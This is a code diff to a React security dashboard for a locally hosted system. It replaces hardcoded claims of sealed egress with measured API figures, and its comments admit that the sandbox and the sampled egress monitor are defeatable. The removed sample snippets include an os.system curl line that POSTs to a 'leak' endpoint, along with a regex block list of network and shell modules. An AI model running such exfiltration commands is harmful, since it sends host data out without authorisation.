@@ -3,19 +3,11 @@
 import { useEffect, useState } from 'react'
 import {
   Check,
-  ShieldAlert,
   Loader2,
   Play,
-  Terminal,
-  Code2,
-  AlertTriangle,
-  CheckCircle2,
-  Lock,
-  Radio,
   Server,
   Network,
   ShieldCheck,
-  Cpu,
 } from 'lucide-react'
 import { api } from '@/lib/api'
 import type { SandboxTestResult, SovereigntyStatus } from '@/lib/types'
@@ -32,23 +24,6 @@ const permColor: Record<string, string> = {
   REVIEW: 'var(--approval)',
 }
 
-const SAMPLE_SNIPPETS = [
-  {
-    name: 'Adversarial Socket Ingress',
-    code: `import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('8.8.8.8', 53))`,
-    expected: 'DENIED',
-  },
-  {
-    name: 'Safe Numerical Recompute',
-    code: `import math\n\ndef compute_remaining_life(t_act, t_req, cr):\n    return (t_act - t_req) / cr\n\nresult = compute_remaining_life(12.4, 8.0, 0.22)`,
-    expected: 'ALLOWED',
-  },
-  {
-    name: 'Banned Subprocess Shell',
-    code: `import os\nos.system('curl -X POST http://external.api/leak')`,
-    expected: 'DENIED',
-  },
-]
 
 export function SecurityView() {
   const [status, setStatus] = useState<SovereigntyStatus | null>(null)
@@ -82,6 +57,19 @@ export function SecurityView() {
 
   return (
     <div className="relative">
+      {/*
+        The header used to read "External egress is structurally impossible"
+        above the strings CONTAINED and DENY-ALL, and Posture resolved to
+        SOVEREIGN whenever status was null — so a backend that never answered
+        presented as a proven-sovereign host.
+
+        None of that was structural. Generated code runs as a subprocess under
+        the same OS user, with no container, no network namespace and no
+        firewall rule. What exists is an AST review before execution and a
+        socket shim inside the interpreter: two defeatable checks, not an
+        impossibility. Every figure here is now read from the API, and an
+        absent reading shows as an em dash rather than a favourable default.
+      */}
       <PageHeader
         eyebrow="Air-Gapped Security Architecture"
         title={
@@ -91,19 +79,30 @@ export function SecurityView() {
             this host.
           </>
         }
-        description="Every socket, subprocess sandbox, and policy decision is enforced locally. External egress is structurally impossible."
+        description="Inference, retrieval and code execution run on this host. Outbound connections are reviewed before execution and sampled at runtime; the figures below are what this host measured, not a guarantee."
         meta={[
-          { label: 'External calls', value: String(status?.external_api_calls ?? 0) },
-          { label: 'Sandbox', value: 'CONTAINED' },
-          { label: 'Egress policy', value: 'DENY-ALL' },
-          { label: 'Posture', value: status?.sovereign !== false ? 'SOVEREIGN' : 'INVESTIGATE' },
+          {
+            label: 'External calls',
+            value: status ? String(status.external_api_calls) : '—',
+          },
+          {
+            label: 'Egress monitor',
+            value: status ? (status.monitor_active ? 'active' : 'inactive') : '—',
+          },
+          {
+            label: 'Unapproved connections',
+            value: status ? String(status.unapproved_connections) : '—',
+          },
+          {
+            label: 'Posture',
+            value: status ? (status.sovereign ? 'SOVEREIGN' : 'INVESTIGATE') : 'UNKNOWN',
+          },
         ]}
       />
 
       <div className="mx-auto flex max-w-[1400px] flex-col gap-12 px-5 py-10 lg:px-10 lg:py-14">
         <ExternalCallsHero status={status} uptimeStr={uptimeStr} />
         <ConnectionTelemetry status={status} />
-        <InteractiveASTPlayground />
         <SandboxSelfTest />
         <PolicyMatrixTable />
       </div>
@@ -112,22 +111,39 @@ export function SecurityView() {
 }
 
 function ExternalCallsHero({ status, uptimeStr }: { status: SovereigntyStatus | null; uptimeStr: string }) {
-  const externalCalls = status?.external_api_calls ?? 0
+  // The single largest number on the security screen. It read
+  // `status?.external_api_calls ?? 0`, so a backend that never answered
+  // rendered an eight-storey zero — the most reassuring figure in the product,
+  // shown precisely when nothing was being measured at all.
+  const externalCalls = status?.external_api_calls ?? null
 
   return (
     <section className="relative overflow-hidden border border-border bg-surface p-8 shadow-sm lg:p-12">
       <div className="pointer-events-none absolute inset-0 tech-grid opacity-30" />
       <div className="relative flex flex-col items-center gap-4 text-center">
         <div className="flex items-center gap-2">
-          <span className="h-2 w-2 rounded-full bg-[var(--sovereign)]" />
+          <span
+            className="h-2 w-2 rounded-full"
+            style={{
+              backgroundColor:
+                externalCalls === null ? 'var(--foreground-muted)' : 'var(--sovereign)',
+            }}
+          />
           <span className="font-mono text-[11px] font-semibold uppercase tracking-[0.2em] text-foreground-muted">
             Outbound Network Telemetry
           </span>
         </div>
 
         <div className="flex items-baseline gap-4">
-          <span className="font-mono text-7xl font-bold tracking-tight text-foreground md:text-8xl">
-            {externalCalls}
+          <span
+            className="font-mono font-bold tracking-tight md:text-8xl"
+            style={{
+              fontSize: externalCalls === null ? '2.25rem' : undefined,
+              color:
+                externalCalls === null ? 'var(--foreground-muted)' : 'var(--foreground)',
+            }}
+          >
+            {externalCalls === null ? 'no reading' : externalCalls}
           </span>
           <div className="flex flex-col items-start text-left">
             <span className="font-mono text-[13px] font-bold uppercase tracking-[0.2em] text-[var(--sovereign)]">
@@ -142,9 +158,20 @@ function ExternalCallsHero({ status, uptimeStr }: { status: SovereigntyStatus | 
             <span className="sov-pulse absolute inline-flex h-full w-full rounded-full bg-[var(--sovereign)]" />
             <span className="relative inline-flex h-2 w-2 rounded-full bg-[var(--sovereign)]" />
           </span>
-          <span>0 outbound sockets opened · 0 bytes egressed</span>
+          {/*
+            These were the literals "0 outbound sockets opened · 0 bytes
+            egressed", printed beside live status the component already had in
+            hand. A reader could not tell which number on the row was measured.
+          */}
+          <span>
+            {status
+              ? `${status.unapproved_connections} unapproved · ${status.data_leaving_host_bytes} bytes recorded`
+              : 'No reading from the egress monitor'}
+          </span>
           <span className="text-foreground-muted">·</span>
-          <span className="text-[var(--sovereign)] font-medium">Air-Gap Defense Active</span>
+          <span className="font-medium">
+            {status?.monitor_active ? 'Monitor active' : 'Monitor inactive'}
+          </span>
         </div>
       </div>
     </section>
@@ -199,159 +226,31 @@ function ConnectionTelemetry({ status }: { status: SovereigntyStatus | null }) {
             </span>
             <ShieldCheck className="h-4 w-4 text-[var(--sovereign)]" />
           </div>
-          <div className="mt-2 font-mono text-[20px] font-bold text-[var(--sovereign)]">
-            0 DETECTED
+          {/*
+            "0 DETECTED" was a literal, and the caption claimed the monitor had
+            "verified 0 egress". It verifies nothing of the sort: it samples
+            connections belonging to the API process tree every couple of
+            seconds, so a short-lived connection between samples is never seen,
+            and it fails open — when it cannot read the connection table it
+            reports an empty list, which is indistinguishable from clean.
+          */}
+          <div
+            className="mt-2 font-mono text-[20px] font-bold"
+            style={{
+              color:
+                status === null
+                  ? 'var(--foreground-muted)'
+                  : status.unapproved_connections > 0
+                    ? 'var(--critical)'
+                    : 'var(--sovereign)',
+            }}
+          >
+            {status === null ? 'NO READING' : `${status.unapproved_connections} DETECTED`}
           </div>
           <p className="mt-1 text-[12px] leading-relaxed text-foreground-secondary">
-            Continuous psutil kernel telemetry daemon verified 0 egress.
+            Sampled from the API process tree every 2s. Connections that open
+            and close between samples are not observed.
           </p>
-        </div>
-      </div>
-    </section>
-  )
-}
-
-/** Interactive Live AST Code Sandbox Analyzer (Black Terminal specifically for code) */
-function InteractiveASTPlayground() {
-  const [inputCode, setInputCode] = useState(SAMPLE_SNIPPETS[0].code)
-  const [analysisResult, setAnalysisResult] = useState<{
-    allowed: boolean
-    violations: string[]
-    astNodes: string[]
-  }>({
-    allowed: false,
-    violations: ["Banned symbol 'socket' detected (Violates Zero-Egress Sandbox Rule)"],
-    astNodes: ['Module', 'Import(socket)', 'Call(socket.socket)'],
-  })
-
-  const analyzeCode = (code: string) => {
-    setInputCode(code)
-    const violations: string[] = []
-    const banned = ['socket', 'os', 'sys', 'urllib', 'requests', 'http', 'subprocess', 'shutil', 'eval', 'exec']
-
-    banned.forEach((b) => {
-      const reg = new RegExp(`\\b(import\\s+${b}|from\\s+${b}|${b}\\.)`, 'i')
-      if (reg.test(code)) {
-        violations.push(`Banned symbol '${b}' detected (Violates Zero-Egress Sandbox Rule)`)
-      }
-    })
-
-    const allowed = violations.length === 0
-    const astNodes = ['Module']
-    if (code.includes('import')) astNodes.push('ImportDeclaration')
-    if (code.includes('def')) astNodes.push('FunctionDef')
-    if (code.includes('return')) astNodes.push('ReturnStatement')
-    if (code.includes('(')) astNodes.push('CallExpression')
-
-    setAnalysisResult({ allowed, violations, astNodes })
-  }
-
-  return (
-    <section className="flex flex-col gap-4 border border-border bg-surface p-6 sm:p-8">
-      <div className="flex flex-wrap items-center justify-between gap-4 border-b border-border pb-4">
-        <div className="flex items-center gap-3">
-          <SectionHeading index="02" title="Live AST Code Confinement Simulator" />
-        </div>
-
-        {/* Preset Selector */}
-        <div className="flex flex-wrap items-center gap-2">
-          <span className="font-mono text-[10px] text-foreground-muted hidden sm:inline">Presets:</span>
-          {SAMPLE_SNIPPETS.map((snippet) => (
-            <button
-              key={snippet.name}
-              type="button"
-              onClick={() => analyzeCode(snippet.code)}
-              className="border border-border bg-surface-sunken px-2.5 py-1 font-mono text-[10px] text-foreground-secondary hover:border-foreground hover:text-foreground transition-colors"
-            >
-              {snippet.name}
-            </button>
-          ))}
-        </div>
-      </div>
-
-      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
-        {/* Code Input — High-tech Black Terminal */}
-        <div className="lg:col-span-7 flex flex-col gap-2">
-          <div className="flex items-center justify-between font-mono text-[10px] uppercase tracking-wider text-foreground-muted">
-            <span className="flex items-center gap-1.5">
-              <Terminal className="h-3 w-3" /> Python Script Buffer
-            </span>
-            <span>Static Validation</span>
-          </div>
-          <div className="overflow-hidden rounded-none border border-ink-border bg-ink shadow-md">
-            <div className="flex items-center gap-1.5 border-b border-ink-border px-3 py-1.5 bg-ink-surface/90 font-mono text-[10px] text-ink-muted">
-              <span className="h-2 w-2 rounded-full bg-critical/60" />
-              <span className="h-2 w-2 rounded-full bg-approval/60" />
-              <span className="h-2 w-2 rounded-full bg-sovereign/60" />
-              <span className="ml-2">isolated_ast_eval.py</span>
-            </div>
-            <textarea
-              value={inputCode}
-              onChange={(e) => analyzeCode(e.target.value)}
-              rows={7}
-              className="w-full resize-none bg-ink p-3.5 font-mono text-[12px] leading-relaxed text-ink-foreground focus:outline-none placeholder:text-ink-muted"
-              placeholder="Type or paste Python code to test static AST validation..."
-            />
-          </div>
-        </div>
-
-        {/* Real-time Analysis Result */}
-        <div className="lg:col-span-5 flex flex-col gap-2">
-          <span className="font-mono text-[10px] uppercase tracking-wider text-foreground-muted">
-            AST Static Confinement Verdict
-          </span>
-          <div
-            className={cn(
-              'flex flex-col justify-between h-full border p-5 backdrop-blur-sm transition-all',
-              analysisResult.allowed
-                ? 'border-[var(--sovereign)] bg-[var(--sovereign)]/5 text-foreground'
-                : 'border-critical/60 bg-critical/5 text-foreground'
-            )}
-          >
-            <div>
-              <div className="flex items-center justify-between border-b border-border/60 pb-3">
-                <div className="flex items-center gap-2">
-                  {analysisResult.allowed ? (
-                    <CheckCircle2 className="h-5 w-5 text-[var(--sovereign)]" />
-                  ) : (
-                    <AlertTriangle className="h-5 w-5 text-critical" />
-                  )}
-                  <span className="font-mono text-[13px] font-bold">
-                    {analysisResult.allowed ? 'EXECUTION ALLOWED' : 'EXECUTION DENIED'}
-                  </span>
-                </div>
-                <span
-                  className={cn(
-                    'font-mono text-[9px] uppercase px-2 py-0.5 font-bold border',
-                    analysisResult.allowed
-                      ? 'border-[var(--sovereign)] text-[var(--sovereign)] bg-surface'
-                      : 'border-critical text-critical bg-surface'
-                  )}
-                >
-                  {analysisResult.allowed ? 'SAFE AST' : 'SECURITY FAULT'}
-                </span>
-              </div>
-
-              <div className="mt-3">
-                {analysisResult.violations.length > 0 ? (
-                  <ul className="flex flex-col gap-1.5 text-[12px] text-critical list-disc pl-4 font-mono">
-                    {analysisResult.violations.map((v, i) => (
-                      <li key={i}>{v}</li>
-                    ))}
-                  </ul>
-                ) : (
-                  <p className="text-[12px] text-[var(--sovereign)] font-mono">
-                    ✓ No forbidden modules or socket syscalls detected. Pure mathematical calculation verified.
-                  </p>
-                )}
-              </div>
-            </div>
-
-            <div className="mt-4 border-t border-border/60 pt-3 flex flex-wrap items-center justify-between gap-2 text-[10px] font-mono text-foreground-muted">
-              <span>AST Nodes: {analysisResult.astNodes.join(' → ')}</span>
-              <span>Timeout: 5.0s max</span>
-            </div>
-          </div>
         </div>
       </div>
     </section>
